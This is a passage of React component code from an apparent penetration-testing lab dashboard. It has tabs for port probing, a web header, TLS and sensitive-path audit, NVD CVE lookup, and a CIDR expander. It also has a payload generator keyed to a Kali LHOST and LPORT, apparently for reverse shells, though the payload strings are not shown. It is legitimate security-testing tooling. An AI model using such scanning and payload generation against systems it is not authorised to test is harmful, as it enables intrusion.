              <span className="text-xs font-medium text-slate-700 dark:text-slate-300">TCP Ports (comma-separated)</span>
              <input
                type="text"
                value={probePorts}
                onChange={(e) => setProbePorts(e.target.value)}
                placeholder="21,22,80,443,8080"
                className="w-full px-3.5 py-2 text-sm font-mono tabular-nums bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] text-slate-900 dark:text-[#E6EDF3] dark:placeholder:text-slate-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-600/20 dark:focus:ring-[#2DD4BF]/25 focus:border-teal-700 dark:focus:border-[#2DD4BF]"
              />
            </label>

            <div className="sm:col-span-3">
              <button
                type="submit"
                disabled={probeLoading}
                className="w-full inline-flex items-center justify-center gap-2 px-4 py-2 text-sm font-semibold text-white bg-teal-700 hover:bg-teal-600 hover:shadow-[0_6px_18px_-4px_rgba(13,148,136,0.42)] dark:bg-[#14B8A6] dark:text-[#042F2E] dark:hover:bg-[#2DD4BF] dark:hover:shadow-[0_6px_22px_-4px_rgba(45,212,191,0.42)] disabled:opacity-60 rounded-lg whitespace-nowrap cursor-pointer"
              >
                <Radio className="w-4 h-4" />
                <span>{probeLoading ? 'Probing Ports...' : 'Run Live Probe'}</span>
              </button>
            </div>
          </form>

          {probeError && (
            <p className="text-xs font-medium text-red-700 dark:text-rose-300 bg-red-50 dark:bg-rose-500/12 border border-red-200 dark:border-rose-500/30 rounded-lg px-3 py-2">
              {probeError}
            </p>
          )}

          {probeSavedNotice && (
            <p className="text-xs font-medium text-emerald-800 dark:text-emerald-300 bg-emerald-50 dark:bg-emerald-500/12 border border-emerald-200 dark:border-emerald-500/30 rounded-lg px-3 py-2">
              {probeSavedNotice}
            </p>
          )}

          {probeResult && (
            <div className="space-y-4">
              <div className="flex flex-wrap items-center justify-between gap-3 pb-3 border-b border-slate-100 dark:border-[#1D2C35]">
                <div className="text-xs text-slate-600 dark:text-slate-300">
                  Target: <strong className="font-mono text-slate-900 dark:text-[#F0F6FA]">{probeResult.host}</strong>{' '}
                  (<span className="font-mono">{probeResult.resolvedIp}</span>) · Probed{' '}
                  {probeResult.results.length} ports
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <button
                    type="button"
                    onClick={handlePushProbeToReport}
                    className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-slate-700 dark:text-slate-200 bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] hover:bg-slate-50 hover:border-teal-500/40 dark:hover:bg-[#19262E] dark:hover:border-[#2DD4BF]/50 rounded-lg cursor-pointer"
                  >
                    <span>Send Probe to VAPT Report</span>
                  </button>
                  {isSignedIn && (
                    <button
                      type="button"
                      onClick={handleSaveLiveProbe}
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 text-xs font-medium text-teal-800 dark:text-[#2DD4BF] bg-teal-50 dark:bg-[#14B8A6]/15 border border-teal-200 dark:border-[#2DD4BF]/35 hover:bg-teal-100 dark:hover:bg-[#14B8A6]/25 rounded-lg cursor-pointer"
                    >
                      <Save className="w-3.5 h-3.5" />
                      <span>Save Probe to Cloud</span>
                    </button>
                  )}
                </div>
              </div>

              <div className="overflow-x-auto">
                <table className="w-full text-xs border border-slate-200 dark:border-[#1D2C35]">
                  <thead className="bg-slate-50 dark:bg-[#131D23] text-slate-700 dark:text-slate-300">
                    <tr>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Port</th>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">State</th>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Service</th>
                      <th className="text-right px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Latency</th>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Live Banner</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-[#1D2C35]">
                    {probeResult.results.map((r) => (
                      <tr key={r.port}>
                        <td className="px-3 py-2 font-mono tabular-nums dark:text-[#2DD4BF]">{r.port}/tcp</td>
                        <td
                          className={`px-3 py-2 font-semibold ${
                            r.status === 'open'
                              ? 'text-emerald-700 dark:text-emerald-400'
                              : r.status === 'closed'
                                ? 'text-slate-500 dark:text-slate-400'
                                : 'text-amber-700 dark:text-amber-400'
                          }`}
                        >
                          {r.status}
                        </td>
                        <td className="px-3 py-2 font-mono dark:text-slate-300">{r.service}</td>
                        <td className="px-3 py-2 text-right font-mono tabular-nums dark:text-slate-300">{r.latencyMs} ms</td>
                        <td className="px-3 py-2 font-mono text-slate-700 dark:text-slate-300 break-all">{r.banner}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 3: Live Web, DNS, TLS & CORS Audit */}
      {toolTab === 'web' && (
        <div className="bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-6 space-y-6">
          <form onSubmit={handleInspectUrl} className="flex flex-col sm:flex-row gap-3">
            <input
              type="text"
              value={inspectUrlInput}
              onChange={(e) => setInspectUrlInput(e.target.value)}
              placeholder="https://example.com"
              className="flex-1 px-3.5 py-2 text-sm font-mono bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] text-slate-900 dark:text-[#E6EDF3] dark:placeholder:text-slate-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-600/20 dark:focus:ring-[#2DD4BF]/25 focus:border-teal-700 dark:focus:border-[#2DD4BF]"
            />
            <button
              type="submit"
              disabled={urlLoading}
              className="inline-flex items-center justify-center gap-2 px-5 py-2 text-sm font-semibold text-white bg-teal-700 hover:bg-teal-600 hover:shadow-[0_6px_18px_-4px_rgba(13,148,136,0.42)] dark:bg-[#14B8A6] dark:text-[#042F2E] dark:hover:bg-[#2DD4BF] dark:hover:shadow-[0_6px_22px_-4px_rgba(45,212,191,0.42)] disabled:opacity-60 rounded-lg whitespace-nowrap shrink-0 cursor-pointer"
            >
              <Globe className="w-4 h-4" />
              <span>{urlLoading ? 'Auditing Target...' : 'Run Full Live Web Audit'}</span>
            </button>
          </form>

          {urlError && (
            <p className="text-xs font-medium text-red-700 dark:text-rose-300 bg-red-50 dark:bg-rose-500/12 border border-red-200 dark:border-rose-500/30 rounded-lg px-3 py-2">
              {urlError}
            </p>
          )}

          {urlResult && (
            <div className="space-y-6">
              <div className="flex flex-wrap items-center justify-between gap-3">
                <div className="text-xs text-slate-600 dark:text-slate-300">
                  Audited <strong className="font-mono text-slate-900 dark:text-[#F0F6FA]">{urlResult.url}</strong> in{' '}
                  <span className="font-mono tabular-nums">{urlResult.responseTimeMs} ms</span>
                </div>
                <button
                  type="button"
                  onClick={handlePushWebAuditToReport}
                  className="inline-flex items-center gap-1.5 px-3.5 py-1.5 text-xs font-medium text-slate-700 dark:text-slate-200 bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] hover:bg-slate-50 hover:border-teal-500/40 dark:hover:bg-[#19262E] dark:hover:border-[#2DD4BF]/50 rounded-lg cursor-pointer"
                >
                  <span>Send Web Audit to VAPT Report</span>
                </button>
              </div>

              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
                <div className="bg-slate-50 dark:bg-[#131D23] border border-slate-200 dark:border-[#1D2C35] rounded-lg p-3.5">
                  <div className="text-slate-500 dark:text-slate-400">Security Posture Score</div>
                  <div
                    className={`mt-1 text-lg font-bold font-mono tabular-nums ${
                      urlResult.securityScore >= 75
                        ? 'text-emerald-700 dark:text-emerald-400'
                        : urlResult.securityScore >= 45
                          ? 'text-amber-700 dark:text-amber-400'
                          : 'text-red-700 dark:text-rose-400'
                    }`}
                  >
                    {urlResult.securityScore} / 100
                  </div>
                </div>
                <div className="bg-slate-50 dark:bg-[#131D23] border border-slate-200 dark:border-[#1D2C35] rounded-lg p-3.5">
                  <div className="text-slate-500 dark:text-slate-400">HTTP Status</div>
                  <div className="mt-1 font-mono font-semibold text-slate-900 dark:text-[#F0F6FA] tabular-nums">
                    {urlResult.statusCode} {urlResult.statusMessage}
                  </div>
                </div>
                <div className="bg-slate-50 dark:bg-[#131D23] border border-slate-200 dark:border-[#1D2C35] rounded-lg p-3.5">
                  <div className="text-slate-500 dark:text-slate-400">Server / Stack Banner</div>
                  <div className="mt-1 font-mono font-semibold text-slate-900 dark:text-[#F0F6FA] truncate">
                    {urlResult.serverBanner}
                  </div>
                </div>
                <div className="bg-slate-50 dark:bg-[#131D23] border border-slate-200 dark:border-[#1D2C35] rounded-lg p-3.5">
                  <div className="text-slate-500 dark:text-slate-400">DNS A / AAAA</div>
                  <div className="mt-1 font-mono text-slate-900 dark:text-[#2DD4BF] truncate">
                    {urlResult.dnsRecords.join(', ') || 'Direct IP'}
                  </div>
                </div>
              </div>

              {/* DNS Mail & Authority Records */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                <div className="bg-slate-50 dark:bg-[#131D23] border border-slate-200 dark:border-[#1D2C35] rounded-lg p-4 space-y-1.5">
                  <div className="font-semibold text-slate-900 dark:text-[#F0F6FA]">DNS Mail &amp; Authority Posture</div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400">NS: </span>
                    <span className="font-mono text-slate-800 dark:text-slate-200">{urlResult.nsRecords.join(', ') || 'None'}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400">MX: </span>
                    <span className="font-mono text-slate-800 dark:text-slate-200">{urlResult.mxRecords.join(', ') || 'None'}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400">SPF: </span>
                    <span className="font-mono text-slate-800 dark:text-slate-200 break-all">{urlResult.spfRecord || 'Missing'}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400">DMARC: </span>
                    <span className="font-mono text-slate-800 dark:text-slate-200 break-all">{urlResult.dmarcRecord || 'Missing'}</span>
                  </div>
                </div>

                <div className="bg-slate-50 dark:bg-[#131D23] border border-slate-200 dark:border-[#1D2C35] rounded-lg p-4 space-y-1.5">
                  <div className="font-semibold text-slate-900 dark:text-[#F0F6FA]">TLS, CORS &amp; Cookie Audit</div>
                  {urlResult.tlsSummary ? (
                    <div className="font-mono text-slate-700 dark:text-[#2DD4BF]">
                      {urlResult.tlsSummary.protocol} · {urlResult.tlsSummary.issuer} · Valid To:{' '}
                      {urlResult.tlsSummary.validTo}
                      {urlResult.tlsSummary.daysRemaining !== null
                        ? ` (${urlResult.tlsSummary.daysRemaining}d left)`
                        : ''}
                    </div>
                  ) : (
                    <div className="text-amber-700 dark:text-amber-400">Plaintext HTTP (no TLS certificate)</div>
                  )}
                  <div>
                    <span className="text-slate-500 dark:text-slate-400">CORS Reflection Check: </span>
                    <span className="font-mono text-slate-800 dark:text-slate-200">{urlResult.corsIssue}</span>
                  </div>
                  <div>
                    <span className="text-slate-500 dark:text-slate-400">Set-Cookie Flags: </span>
                    <span className="font-mono text-slate-800 dark:text-slate-200">
                      {urlResult.cookieIssues.length === 0
                        ? 'No cookies issued on GET'
                        : urlResult.cookieIssues
                            .map((c) => `${c.name}: ${c.ok ? 'Hardened' : `Missing ${c.missingFlags.join('/')}`}`)
                            .join('; ')}
                    </span>
                  </div>
                </div>
              </div>

              {/* HTTP Security Headers */}
              <div className="overflow-x-auto">
                <table className="w-full text-xs border border-slate-200 dark:border-[#1D2C35]">
                  <thead className="bg-slate-50 dark:bg-[#131D23] text-slate-700 dark:text-slate-300">
                    <tr>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Security Header</th>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Status</th>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Observed Value</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-[#1D2C35]">
                    {urlResult.securityHeadersChecklist.map((row) => (
                      <tr key={row.header}>
                        <td className="px-3 py-2 font-mono font-medium text-slate-900 dark:text-[#F0F6FA]">
                          {row.header}
                        </td>
                        <td
                          className={`px-3 py-2 font-semibold ${
                            row.present
                              ? 'text-emerald-700 dark:text-emerald-400'
                              : 'text-amber-700 dark:text-amber-400'
                          }`}
                        >
                          {row.present ? 'Present' : 'Missing'}
                        </td>
                        <td className="px-3 py-2 font-mono text-slate-600 dark:text-slate-300 break-all">{row.value}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Sensitive / Discovery Paths Probe */}
              <div className="overflow-x-auto">
                <table className="w-full text-xs border border-slate-200 dark:border-[#1D2C35]">
                  <thead className="bg-slate-50 dark:bg-[#131D23] text-slate-700 dark:text-slate-300">
                    <tr>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Probed Path</th>
                      <th className="text-right px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">HTTP Status</th>
                      <th className="text-left px-3 py-2 border-b border-slate-200 dark:border-[#1D2C35]">Assessment</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-100 dark:divide-[#1D2C35]">
                    {urlResult.pathChecks.map((p) => (
                      <tr key={p.path}>
                        <td className="px-3 py-2 font-mono text-slate-900 dark:text-[#F0F6FA]">{p.path}</td>
                        <td className="px-3 py-2 text-right font-mono tabular-nums dark:text-slate-300">{p.statusCode}</td>
                        <td className="px-3 py-2 text-slate-700 dark:text-slate-300">{p.note}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 4: Live NIST NVD CVE Intelligence */}
      {toolTab === 'cve' && (
        <div className="bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-6 space-y-6">
          <div className="space-y-1">
            <h2 className="text-base font-semibold text-slate-900 dark:text-[#F0F6FA]">
              Live NIST NVD CVE Intelligence Lookup
            </h2>
            <p className="text-xs text-slate-500 dark:text-slate-400">
              Queries the live NIST National Vulnerability Database (NVD API 2.0) for real CVEs, CVSS
              scores, and advisory links for any discovered software version or CVE ID.
            </p>
          </div>

          <form
            onSubmit={(e) => {
              e.preventDefault();
              void runCveSearch(cveQuery);
            }}
            className="flex flex-col sm:flex-row gap-3"
          >
            <input
              type="text"
              value={cveQuery}
              onChange={(e) => setCveQuery(e.target.value)}
              placeholder="e.g. vsftpd 2.3.4, Samba 3.0.20, Apache 2.2.8, OpenSSH"
              className="flex-1 px-3.5 py-2 text-sm font-mono bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] text-slate-900 dark:text-[#E6EDF3] dark:placeholder:text-slate-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-600/20 dark:focus:ring-[#2DD4BF]/25 focus:border-teal-700 dark:focus:border-[#2DD4BF]"
            />
            <button
              type="submit"
              disabled={cveLoading}
              className="inline-flex items-center justify-center gap-2 px-5 py-2 text-sm font-semibold text-white bg-teal-700 hover:bg-teal-600 hover:shadow-[0_6px_18px_-4px_rgba(13,148,136,0.42)] dark:bg-[#14B8A6] dark:text-[#042F2E] dark:hover:bg-[#2DD4BF] dark:hover:shadow-[0_6px_22px_-4px_rgba(45,212,191,0.42)] disabled:opacity-60 rounded-lg whitespace-nowrap shrink-0 cursor-pointer"
            >
              <Database className="w-4 h-4" />
              <span>{cveLoading ? 'Querying NVD...' : 'Search Live NVD'}</span>
            </button>
          </form>

          {cveError && (
            <p className="text-xs font-medium text-red-700 dark:text-rose-300 bg-red-50 dark:bg-rose-500/12 border border-red-200 dark:border-rose-500/30 rounded-lg px-3 py-2">
              {cveError}
            </p>
          )}

          {cveLastQuery && !cveLoading && cveResults.length === 0 && !cveError && (
            <p className="text-xs text-slate-500 dark:text-slate-400">
              No CVE entries returned by NVD for <span className="font-mono">{cveLastQuery}</span>. Try a
              broader product keyword (e.g., <span className="font-mono">vsftpd</span> or{' '}
              <span className="font-mono">samba 3.0</span>).
            </p>
          )}

          {cveResults.length > 0 && (
            <div className="space-y-3">
              <div className="text-xs text-slate-600 dark:text-slate-300">
                Showing {cveResults.length} live NVD matches for{' '}
                <strong className="font-mono text-slate-900 dark:text-[#F0F6FA]">{cveLastQuery}</strong>
              </div>
              <div className="divide-y divide-slate-200 dark:divide-[#1D2C35] border border-slate-200 dark:border-[#1D2C35] rounded-lg">
                {cveResults.map((item) => (
                  <div key={item.id} className="p-4 space-y-1.5">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <div className="flex items-center gap-2.5">
                        <span className="text-sm font-mono font-semibold text-slate-900 dark:text-[#F0F6FA]">{item.id}</span>
                        <span
                          className={`text-xs font-semibold ${
                            item.severity === 'CRITICAL'
                              ? 'text-red-700 dark:text-rose-400'
                              : item.severity === 'HIGH'
                                ? 'text-amber-700 dark:text-amber-400'
                                : 'text-slate-600 dark:text-slate-400'
                          }`}
                        >
                          {item.severity}
                          {item.cvssScore !== null ? ` (${item.cvssScore.toFixed(1)})` : ''}
                        </span>
                      </div>
                      <span className="text-xs font-mono text-slate-500 dark:text-slate-400">Published: {item.published}</span>
                    </div>
                    <p className="text-xs text-slate-700 dark:text-slate-300 leading-relaxed">{item.description}</p>
                    <div>
                      <a
                        href={item.referenceUrl}
                        target="_blank"
                        rel="noreferrer"
                        className="inline-flex items-center gap-1 text-xs font-medium text-teal-700 hover:text-teal-800 dark:text-[#2DD4BF] dark:hover:text-[#5EEAD4]"
                      >
                        <span>View Advisory Reference</span>
                        <ExternalLink className="w-3 h-3" />
                      </a>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 5: CIDR & Payload Workbench */}
      {toolTab === 'cidr' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 items-start">
          <div className="bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-5 space-y-4">
            <div>
              <h2 className="text-sm font-semibold text-slate-900 dark:text-[#F0F6FA]">CIDR Subnet Host Expander</h2>
              <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                Calculate usable host IPs for your VirtualBox subnet before running scans.
              </p>
            </div>
            <input
              type="text"
              value={cidrInput}
              onChange={(e) => setCidrInput(e.target.value)}
              placeholder="192.168.56.96/28"
              className="w-full px-3 py-2 text-sm font-mono bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] text-slate-900 dark:text-[#E6EDF3] dark:placeholder:text-slate-500 rounded-lg focus:outline-none focus:ring-2 focus:ring-teal-600/20 dark:focus:ring-[#2DD4BF]/25 focus:border-teal-700 dark:focus:border-[#2DD4BF]"
            />
            {cidrExpanded.error ? (
              <p className="text-xs text-red-700 dark:text-rose-400">{cidrExpanded.error}</p>
            ) : (
              <div className="space-y-2">
                <div className="text-xs text-slate-600 dark:text-slate-300 tabular-nums">
                  Usable Hosts: <strong className="dark:text-[#2DD4BF]">{cidrExpanded.hosts.length}</strong>
                </div>
                <div className="max-h-60 overflow-y-auto bg-[#05080A] border border-[#1D2C35] text-teal-300 rounded-lg p-3 text-xs font-mono leading-relaxed">
                  {cidrExpanded.hosts.join('\n')}
                </div>
              </div>
            )}
          </div>

          <div className="bg-white dark:bg-[#0D1418] border border-slate-200 dark:border-[#1D2C35] rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between gap-3">
              <div>
                <h2 className="text-sm font-semibold text-slate-900 dark:text-[#F0F6FA]">
                  Authorized Lab Payload Generator
                </h2>
                <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
                  Parameterized with Kali LHOST <code className="font-mono text-teal-700 dark:text-[#2DD4BF]">{kaliIp}</code>
                </p>
              </div>
              <label className="flex items-center gap-2 text-xs">
                <span className="text-slate-600 dark:text-slate-300">LPORT</span>
                <input
                  type="text"
                  value={lportInput}
                  onChange={(e) => setLportInput(e.target.value)}
                  className="w-20 px-2 py-1 font-mono tabular-nums bg-white dark:bg-[#131D23] border border-slate-300 dark:border-[#273B47] text-slate-900 dark:text-[#E6EDF3] rounded-md focus:outline-none focus:ring-2 focus:ring-teal-600/20 dark:focus:ring-[#2DD4BF]/25 focus:border-teal-700 dark:focus:border-[#2DD4BF]"
                />
              </label>
            </div>

            <div className="space-y-3">
              {payloads.map((item) => (
                <div key={item.id} className="bg-[#05080A] border border-[#1D2C35] rounded-lg p-3 space-y-1.5">
                  <div className="flex items-center justify-between gap-2">
                    <span className="text-[11px] font-medium text-slate-400">{item.label}</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(item.code, item.id)}
                      className="inline-flex items-center gap-1 px-2 py-0.5 text-[11px] text-slate-300 hover:text-[#2DD4BF] rounded cursor-pointer"
                    >
                      {copiedId === item.id ? (
                        <>
                          <Check className="w-3 h-3 text-emerald-400" />
                          <span>Copied</span>
                        </>
                      ) : (
                        <>
                          <Copy className="w-3 h-3" />
                          <span>Copy</span>
                        </>
                      )}
                    </button>
                  </div>
                  <pre className="text-[11px] font-mono text-teal-300 overflow-x-auto">
                    <code>{item.code}</code>
                  </pre>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
